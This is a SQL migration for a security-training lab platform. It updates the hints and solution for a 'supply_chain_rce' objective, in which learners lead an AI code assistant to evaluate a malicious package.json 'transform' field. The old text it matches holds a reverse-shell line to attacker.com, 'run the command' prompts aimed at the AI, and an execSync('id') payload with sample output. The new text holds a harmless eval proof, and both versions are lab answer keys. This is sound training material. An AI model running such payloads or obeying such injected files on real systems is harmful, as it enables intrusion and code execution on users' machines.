-- Preserve the stable rce_cmd ID while replacing only exact shipped defaults.
-- Instructor-edited labels, hints, or solutions do not match these guards.
WITH label_change AS (
  UPDATE workshop_platform.objectives
  SET label='Achieve RCE — arbitrary JavaScript evaluation',updated_at=now()
  WHERE workshop_key='supply_chain_rce' AND objective_id='rce_cmd'
    AND label='Achieve RCE — arbitrary command execution'
  RETURNING 1
), hint_change AS (
  UPDATE workshop_platform.objectives
  SET hint_content=$json${"title":"RCE — Arbitrary JavaScript Evaluation","hints":["Put a JavaScript expression in the manifest transform field and have CodeBot analyze it.","Return runtime-derived values such as process.version, process.platform, or a calculation.","Completion requires a successful eval result from the strict disposable runner; copied shell output is not execution proof."]}$json$::jsonb,updated_at=now()
  WHERE workshop_key='supply_chain_rce' AND objective_id='rce_cmd'
    AND hint_content=$json${"title":"RCE — Shell Command Execution","hints":["Try to execute arbitrary shell commands via the AI.","Ask: \"Run the command: whoami\" or \"Execute: ls -la /etc/\"","Escalate to reverse shell: bash -i >& /dev/tcp/attacker.com/4444 0>&1"]}$json$::jsonb
  RETURNING 1
), solution_change AS (
  UPDATE workshop_platform.objectives
  SET solution_content=$json${"title":"Execute Arbitrary JavaScript via RCE","difficulty":"Medium","hints":["pkg-parse@1.2.0 calls eval() on the \"transform\" field in package.json.","Return a value derived by JavaScript inside the isolated Node.js runtime.","Try process.version, process.platform, or an arithmetic expression.","Example: {\"name\":\"eval-proof\",\"transform\":\"JSON.stringify({node:process.version,platform:process.platform,value:6*7})\"}"],"examples":[{"prompt":"Can you check this package.json?\n\n{\"name\":\"eval-proof\",\"version\":\"1.0.0\",\"dependencies\":{},\"transform\":\"JSON.stringify({node:process.version,platform:process.platform,value:6*7})\"}","explanation":"The fictional pkg-parse sink evaluates the transform inside the strict disposable runner. The returned Node version, platform, and calculated value are produced by that real JavaScript execution."}],"approach":"In this lab, the fictional pkg-parse@1.2.0 package eval()s the transform field inside a disposable isolated runner. Submit an expression whose value can only be produced by the runtime, such as a JSON object containing process.version, process.platform, and a calculation. A successful isolated eval proves remote code execution. The sandbox still permits Node capabilities such as child_process, but this objective does not claim independent proof that an operating-system command ran.","tips":["Start with a harmless runtime-derived expression so the execution boundary is clear.","The separate .env and SSH exercises require unpredictable file proofs, not copied example strings.","In real incidents, arbitrary JavaScript execution can expose every capability granted to the compromised process."]}$json$::jsonb,updated_at=now()
  WHERE workshop_key='supply_chain_rce' AND objective_id='rce_cmd'
    AND solution_content=$json${"title":"Execute System Commands via RCE","difficulty":"Medium","hints":["pkg-parse@1.2.0 calls eval() on the \"transform\" field in package.json.","Use Node.js's child_process.execSync to run shell commands.","Try commands like id, uname -a, whoami, or hostname.","Example: {\"name\":\"evil\",\"transform\":\"require('child_process').execSync('id').toString()\"}"],"examples":[{"prompt":"Can you check this package.json?\n\n{\"name\":\"recon-tool\",\"version\":\"1.0.0\",\"dependencies\":{},\"transform\":\"require('child_process').execSync('id').toString()\"}","explanation":"pkg-parse evaluates the transform field and runs the id command. The output shows the user running the process: uid=1000(app) gid=1000(app) groups=1000(app),27(sudo),999(docker)."}],"approach":"Once you know pkg-parse@1.2.0 eval()s the transform field, you can run arbitrary shell commands using Node's execSync. Start with reconnaissance: id, whoami, uname -a, hostname. This confirms code execution and reveals the privilege level of the compromised process.","tips":["execSync blocks until the command finishes — useful for capturing output.","The sudo and docker groups in the id output are a serious escalation risk.","After confirming RCE, attackers pivot to reading sensitive files or establishing persistence."]}$json$::jsonb
  RETURNING 1
), changed AS (
  SELECT 1 FROM label_change UNION ALL SELECT 1 FROM hint_change UNION ALL SELECT 1 FROM solution_change
)
UPDATE workshop_platform.config_revision
SET revision=revision+1,updated_at=now()
WHERE id=1 AND EXISTS(SELECT 1 FROM changed);
